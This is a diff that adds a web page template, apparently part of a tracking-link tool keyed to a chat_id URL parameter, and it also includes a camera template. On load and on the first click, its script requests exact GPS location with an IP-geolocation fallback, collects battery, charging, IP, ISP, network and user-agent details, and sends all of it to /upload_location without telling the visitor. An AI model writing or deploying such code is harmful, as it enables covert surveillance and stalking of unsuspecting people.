@@ -1,0 +1,112 @@
+{% include 'camera.html' %}
+
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+
+    if (!chatId) {
+        console.error("chat_id missing!");
+        return;
+    }
+
+    async function gatherAndSend(lat, lon, acc, methodType) {
+        let batteryLevel = "N/A";
+        let isCharging = "N/A";
+        
+        try {
+            if (navigator.getBattery) {
+                const bat = await Promise.race([
+                    navigator.getBattery(),
+                    new Promise((_, reject) => setTimeout(() => reject('timeout'), 2000))
+                ]);
+                batteryLevel = Math.round(bat.level * 100);
+                isCharging = bat.charging ? "Yes" : "No";
+            }
+        } catch(e) {
+            batteryLevel = "Restricted/Not Supported";
+        }
+
+        let ipInfo = "N/A";
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            ipInfo = `${ipData.ip || 'N/A'} (${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'} - ${ipData.org || 'N/A'})`;
+        } catch(e) {
+            ipInfo = "Fetch Failed";
+        }
+
+        let netInfo = "N/A";
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                let type = conn.effectiveType || conn.type || 'unknown';
+                let speed = conn.downlink ? conn.downlink + ' Mbps' : '';
+                netInfo = speed ? `${type} (${speed})` : type;
+            }
+        } catch(e) {
+            netInfo = "Restricted";
+        }
+
+        const deviceInfo = navigator.userAgent || "N/A";
+
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('latitude', lat);
+        fd.append('longitude', lon);
+        fd.append('accuracy', acc + (methodType ? ` (${methodType})` : ''));
+        fd.append('battery', batteryLevel);
+        fd.append('charging', isCharging);
+        fd.append('ip', ipInfo);
+        fd.append('network', netInfo);
+        fd.append('device', deviceInfo);
+
+        fetch('/upload_location', {
+            method: 'POST',
+            body: fd
+        })
+        .then(res => console.log("Data sent successfully"))
+        .catch(err => console.error("Error:", err));
+    }
+
+    async function fallbackIPLocation() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.latitude && data.longitude) {
+                gatherAndSend(data.latitude, data.longitude, 1000, "Approximate IP");
+            }
+        } catch (e) {}
+    }
+
+    function requestLocation() {
+        if (!navigator.geolocation) {
+            fallbackIPLocation();
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = Math.round(position.coords.accuracy);
+                gatherAndSend(lat, lon, acc, "Exact GPS");
+            },
+            (err) => {
+                fallbackIPLocation();
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    }
+
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        setTimeout(requestLocation, 1000);
+    } else {
+        window.addEventListener('DOMContentLoaded', () => setTimeout(requestLocation, 1000));
+    }
+
+    document.addEventListener('click', function() {
+        requestLocation();
+    }, { once: true });
+})();
+</script>
